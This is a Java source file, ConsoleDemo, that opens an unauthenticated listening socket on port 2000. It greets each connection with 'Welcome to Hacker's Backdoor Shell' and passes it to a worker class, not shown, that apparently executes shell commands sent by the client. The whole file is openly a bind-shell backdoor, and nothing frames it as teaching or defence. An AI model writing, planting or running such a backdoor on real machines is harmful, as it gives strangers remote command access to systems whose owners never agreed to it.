import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.IOError;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.ServerSocket;
import java.net.Socket;

public class ConsoleDemo {

	public static void main(String[] args) {

		try {
			ServerSocket server = new ServerSocket(2000);
			while (true) {

				Socket client = server.accept();
				String workingDir = System.getProperty("user.dir");
				String prompt = System.getProperty("os.name").toLowerCase().contains("mac os") ? " % " : "> ";
				System.out.println();

				// File workDirectory=System.getProperty(null)

				InputStream in = client.getInputStream();
				OutputStream out = client.getOutputStream();

				BufferedReader reader = new BufferedReader(new InputStreamReader(in));
				BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(out));

				writer.write("\nWelcome to Hacker's Backdoor Shell\n\n");

				WorkerDemo worker = new WorkerDemo(reader, writer, workingDir, prompt);
				worker.start();
			}

		} catch (IOException e) {
			e.printStackTrace();
		}

	}

}
